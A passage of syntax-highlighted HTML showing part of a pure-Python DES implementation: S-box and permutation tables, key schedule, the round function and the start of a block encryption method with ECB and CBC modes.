<span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>,</span><br><span class="line">         <span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>],</span><br><span class="line"></span><br><span class="line">        <span class="comment"># S2</span></span><br><span class="line">        [<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line">         <span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>,</span><br><span class="line">         <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>,</span><br><span class="line">         <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line"></span><br><span class="line">        <span class="comment"># S3</span></span><br><span class="line">        [<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>,</span><br><span class="line">         <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>,</span><br><span class="line">         <span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>,</span><br><span class="line">         <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>],</span><br><span class="line"></span><br><span class="line">        <span class="comment"># S4</span></span><br><span class="line">        [<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>,</span><br><span class="line">         <span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">         <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>,</span><br><span class="line">         <span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>],</span><br><span class="line"></span><br><span class="line">        <span class="comment"># S5</span></span><br><span class="line">        [<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">         <span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">         <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>,</span><br><span class="line">         <span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>],</span><br><span class="line"></span><br><span class="line">        <span class="comment"># S6</span></span><br><span class="line">        [<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line">         <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">         <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>,</span><br><span class="line">         <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>],</span><br><span class="line"></span><br><span class="line">        <span class="comment"># S7</span></span><br><span class="line">        [<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>,</span><br><span class="line">         <span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">         <span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">         <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>],</span><br><span class="line"></span><br><span class="line">        <span class="comment"># S8</span></span><br><span class="line">        [<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>,</span><br><span class="line">         <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">         <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>,</span><br><span class="line">         <span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>],</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 32-bit permutation function P used on the output of the S-boxes</span></span><br><span class="line">    __p = [</span><br><span class="line">        <span class="number">15</span>, <span class="number">6</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">28</span>, <span class="number">11</span>,</span><br><span class="line">        <span class="number">27</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">25</span>,</span><br><span class="line">        <span class="number">4</span>, <span class="number">17</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">23</span>, <span class="number">13</span>, <span class="number">31</span>, <span class="number">26</span>, <span class="number">2</span>, <span class="number">8</span>,</span><br><span class="line">        <span class="number">18</span>, <span class="number">12</span>, <span class="number">29</span>, <span class="number">5</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">        <span class="number">3</span>, <span class="number">24</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># final permutation IP^-1</span></span><br><span class="line">    __fp = [</span><br><span class="line">        <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">        <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">        <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">        <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">        <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">        <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">        <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>,</span><br><span class="line">        <span class="number">32</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Type of crypting being done</span></span><br><span class="line">    ENCRYPT = <span class="number">0x00</span></span><br><span class="line">    DECRYPT = <span class="number">0x01</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Initialisation</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key, mode=ECB, IV=None, pad=None, padmode=PAD_NORMAL)</span>:</span></span><br><span class="line">        <span class="comment"># Sanity checking of arguments.</span></span><br><span class="line">        <span class="keyword">if</span> len(key) != <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"Invalid DES key size. Key must be exactly 8 bytes long."</span>)</span><br><span class="line">        _baseDes.__init__(self, mode, IV, pad, padmode)</span><br><span class="line">        self.key_size = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">        self.L = []</span><br><span class="line">        self.R = []</span><br><span class="line">        self.Kn = [[<span class="number">0</span>] * <span class="number">48</span>] * <span class="number">16</span>  <span class="comment"># 16 48-bit keys (K1 - K16)</span></span><br><span class="line">        self.final = []</span><br><span class="line"></span><br><span class="line">        self.setKey(key)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setKey</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        <span class="string">"""Will set the crypting key for this object. Must be 8 bytes."""</span></span><br><span class="line">        _baseDes.setKey(self, key)</span><br><span class="line">        self.__create_sub_keys()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__String_to_BitList</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="string">"""Turn the string data, into a list of bits (1, 0)'s"""</span></span><br><span class="line">        <span class="keyword">if</span> _pythonMajorVersion &lt; <span class="number">3</span>:</span><br><span class="line">            <span class="comment"># Turn the strings into integers. Python 3 uses a bytes</span></span><br><span class="line">            <span class="comment"># class, which already has this behaviour.</span></span><br><span class="line">            data = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> data]</span><br><span class="line">        l = len(data) * <span class="number">8</span></span><br><span class="line">        result = [<span class="number">0</span>] * l</span><br><span class="line">        pos = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> data:</span><br><span class="line">            i = <span class="number">7</span></span><br><span class="line">            <span class="keyword">while</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> ch &amp; (<span class="number">1</span> &lt;&lt; i) != <span class="number">0</span>:</span><br><span class="line">                    result[pos] = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    result[pos] = <span class="number">0</span></span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__BitList_to_String</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="string">"""Turn the list of bits -&gt; data, into a string"""</span></span><br><span class="line">        result = []</span><br><span class="line">        pos = <span class="number">0</span></span><br><span class="line">        c = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> pos &lt; len(data):</span><br><span class="line">            c += data[pos] &lt;&lt; (<span class="number">7</span> - (pos % <span class="number">8</span>))</span><br><span class="line">            <span class="keyword">if</span> (pos % <span class="number">8</span>) == <span class="number">7</span>:</span><br><span class="line">                result.append(c)</span><br><span class="line">                c = <span class="number">0</span></span><br><span class="line">            pos += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> _pythonMajorVersion &lt; <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>.join([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> result])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> bytes(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__permutate</span><span class="params">(self, table, block)</span>:</span></span><br><span class="line">        <span class="string">"""Permutate this block with the specified table"""</span></span><br><span class="line">        <span class="keyword">return</span> list(map(<span class="keyword">lambda</span> x: block[x], table))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Transform the secret key, so that it is ready for data processing</span></span><br><span class="line">    <span class="comment"># Create the 16 subkeys, K[1] - K[16]</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__create_sub_keys</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""Create the 16 subkeys K[1] to K[16] from the given key"""</span></span><br><span class="line">        key = self.__permutate(des.__pc1, self.__String_to_BitList(self.getKey()))</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="comment"># Split into Left and Right sections</span></span><br><span class="line">        self.L = key[:<span class="number">28</span>]</span><br><span class="line">        self.R = key[<span class="number">28</span>:]</span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="number">16</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">            <span class="comment"># Perform circular left shifts</span></span><br><span class="line">            <span class="keyword">while</span> j &lt; des.__left_rotations[i]:</span><br><span class="line">                self.L.append(self.L[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">del</span> self.L[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                self.R.append(self.R[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">del</span> self.R[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Create one of the 16 subkeys through pc2 permutation</span></span><br><span class="line">            self.Kn[i] = self.__permutate(des.__pc2, self.L + self.R)</span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Main part of the encryption algorithm, the number cruncher :)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__des_crypt</span><span class="params">(self, block, crypt_type)</span>:</span></span><br><span class="line">        <span class="string">"""Crypt the block of data through DES bit-manipulation"""</span></span><br><span class="line">        block = self.__permutate(des.__ip, block)</span><br><span class="line">        self.L = block[:<span class="number">32</span>]</span><br><span class="line">        self.R = block[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Encryption starts from Kn[1] through to Kn[16]</span></span><br><span class="line">        <span class="keyword">if</span> crypt_type == des.ENCRYPT:</span><br><span class="line">            iteration = <span class="number">0</span></span><br><span class="line">            iteration_adjustment = <span class="number">1</span></span><br><span class="line">        <span class="comment"># Decryption starts from Kn[16] down to Kn[1]</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            iteration = <span class="number">15</span></span><br><span class="line">            iteration_adjustment = <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="number">16</span>:</span><br><span class="line">            <span class="comment"># Make a copy of R[i-1], this will later become L[i]</span></span><br><span class="line">            tempR = self.R[:]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Permutate R[i - 1] to start creating R[i]</span></span><br><span class="line">            self.R = self.__permutate(des.__expansion_table, self.R)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Exclusive or R[i - 1] with K[i], create B[1] to B[8] whilst here</span></span><br><span class="line">            self.R = list(map(<span class="keyword">lambda</span> x, y: x ^ y, self.R, self.Kn[iteration]))</span><br><span class="line">            B = [self.R[:<span class="number">6</span>], self.R[<span class="number">6</span>:<span class="number">12</span>], self.R[<span class="number">12</span>:<span class="number">18</span>], self.R[<span class="number">18</span>:<span class="number">24</span>], self.R[<span class="number">24</span>:<span class="number">30</span>], self.R[<span class="number">30</span>:<span class="number">36</span>], self.R[<span class="number">36</span>:<span class="number">42</span>],</span><br><span class="line">                 self.R[<span class="number">42</span>:]]</span><br><span class="line">            <span class="comment"># Optimization: Replaced below commented code with above</span></span><br><span class="line">            <span class="comment"># j = 0</span></span><br><span class="line">            <span class="comment"># B = []</span></span><br><span class="line">            <span class="comment"># while j &lt; len(self.R):</span></span><br><span class="line">            <span class="comment">#	self.R[j] = self.R[j] ^ self.Kn[iteration][j]</span></span><br><span class="line">            <span class="comment">#	j += 1</span></span><br><span class="line">            <span class="comment">#	if j % 6 == 0:</span></span><br><span class="line">            <span class="comment">#		B.append(self.R[j-6:j])</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Permutate B[1] to B[8] using the S-Boxes</span></span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">            Bn = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">            pos = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> j &lt; <span class="number">8</span>:</span><br><span class="line">                <span class="comment"># Work out the offsets</span></span><br><span class="line">                m = (B[j][<span class="number">0</span>] &lt;&lt; <span class="number">1</span>) + B[j][<span class="number">5</span>]</span><br><span class="line">                n = (B[j][<span class="number">1</span>] &lt;&lt; <span class="number">3</span>) + (B[j][<span class="number">2</span>] &lt;&lt; <span class="number">2</span>) + (B[j][<span class="number">3</span>] &lt;&lt; <span class="number">1</span>) + B[j][<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Find the permutation value</span></span><br><span class="line">                v = des.__sbox[j][(m &lt;&lt; <span class="number">4</span>) + n]</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Turn value into bits, add it to result: Bn</span></span><br><span class="line">                Bn[pos] = (v &amp; <span class="number">8</span>) &gt;&gt; <span class="number">3</span></span><br><span class="line">                Bn[pos + <span class="number">1</span>] = (v &amp; <span class="number">4</span>) &gt;&gt; <span class="number">2</span></span><br><span class="line">                Bn[pos + <span class="number">2</span>] = (v &amp; <span class="number">2</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">                Bn[pos + <span class="number">3</span>] = v &amp; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                pos += <span class="number">4</span></span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Permutate the concatination of B[1] to B[8] (Bn)</span></span><br><span class="line">            self.R = self.__permutate(des.__p, Bn)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Xor with L[i - 1]</span></span><br><span class="line">            self.R = list(map(<span class="keyword">lambda</span> x, y: x ^ y, self.R, self.L))</span><br><span class="line">            <span class="comment"># Optimization: This now replaces the below commented code</span></span><br><span class="line">            <span class="comment"># j = 0</span></span><br><span class="line">            <span class="comment"># while j &lt; len(self.R):</span></span><br><span class="line">            <span class="comment">#	self.R[j] = self.R[j] ^ self.L[j]</span></span><br><span class="line">            <span class="comment">#	j += 1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># L[i] becomes R[i - 1]</span></span><br><span class="line">            self.L = tempR</span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            iteration += iteration_adjustment</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Final permutation of R[16]L[16]</span></span><br><span class="line">        self.final = self.__permutate(des.__fp, self.R + self.L)</span><br><span class="line">        <span class="keyword">return</span> self.final</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Data to be encrypted/decrypted</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(self, data, crypt_type)</span>:</span></span><br><span class="line">        <span class="string">"""Crypt the data in blocks, running it through des_crypt()"""</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Error check the data</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> len(data) % self.block_size != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> crypt_type == des.DECRYPT:  <span class="comment"># Decryption must work on 8 byte blocks</span></span><br><span class="line">                <span class="keyword">raise</span> ValueError(</span><br><span class="line">                    <span class="string">"Invalid data length, data must be a multiple of "</span> + str(self.block_size) + <span class="string">" bytes\n."</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.getPadding():</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">"Invalid data length, data must be a multiple of "</span> + str(</span><br><span class="line">                    self.block_size) + <span class="string">" bytes\n. Try setting the optional padding character"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                data += (self.block_size - (len(data) % self.block_size)) * self.getPadding()</span><br><span class="line">        <span class="comment"># print "Len of data: %f" % (len(data) / self.block_size)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.getMode() == CBC:</span><br><span class="line">            <span class="keyword">if</span> self.getIV():</span><br><span class="line">                iv = self.__String_to_BitList(self.getIV())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">"For CBC mode, you must supply the Initial Value (IV) for ciphering"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Split the data into blocks, crypting each one seperately</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        dict = &#123;&#125;</span><br><span class="line">        result = []</span><br><span class="line">        <span class="comment"># cached = 0</span></span><br><span class="line">        <span class="comment"># lines = 0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; len(data):</span><br><span class="line">            <span class="comment"># Test code for caching encryption results</span></span><br><span class="line">            <span class="comment"># lines += 1</span></span><br><span class="line">            <span class="comment"># if dict.has_key(data[i:i+8]):</span></span><br><span class="line">            <span class="comment"># print "Cached result for: %s" % data[i:i+8]</span></span><br><span class="line">            <span class="comment">#	cached += 1</span></span><br><span class="line">            <span class="comment">#	result.append(dict[data[i:i+8]])</span></span><br><span class="line">            <span class="comment">#	i += 8</span></span><br><span class="line">            <span class="comment">#	continue</span></span><br><span class="line"></span><br><span class="line">            block = self.__String_to_BitList(data[i:i + <span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Xor with IV if using CBC mode</span></span><br><span class="line">            <span class="keyword">if</span> self.getMode() == CBC:</span><br><span class="line">                <span class="keyword">if</span> crypt_type == des.ENCRYPT:</span><br><span class="line">                    block = list(map(<span class="keyword">lambda</span> x, y: x ^ y, block, iv))</span><br><span class="line">                <span class="comment"># j = 0</span></span><br><span class="line">                <span class="comment"># while j &lt; len(block):</span></span><br><span class="line">                <span class="comment">#	block[j] = block[j] ^ iv[j]</span></span><br><span class="line">                <span class="comment">#	j += 1</span></span><br><span class="line"></span><br><span class="line">                processed_block = self.__des_crypt(block, crypt_type)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> crypt_type == des.DECRYPT:</span><br><span class="line">                    processed_block = list(map(<span class="keyword">lambda</span> x, y: x ^ y, processed_block, iv))</span><br><span class="line">                    <span class="comment"># j = 0</span></span><br><span class="line">                    <span class="comment"># while j &lt; len(processed_block):</span></span><br><span class="line">                    <span class="comment">#	processed_block[j] = processed_block[j] ^ iv[j]</span></span><br><span class="line">                    <span class="comment">#	j += 1</span></span><br><span class="line">                    iv = block</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    iv = processed_block</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                processed_block = self.__des_crypt(block, crypt_type)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Add the resulting crypted block to our list</span></span><br><span class="line">            <span class="comment"># d = self.__BitList_to_String(processed_block)</span></span><br><span class="line">            <span class="comment"># result.append(d)</span></span><br><span class="line">            result.append(self.__BitList_to_String(processed_block))</span><br><span class="line">            <span 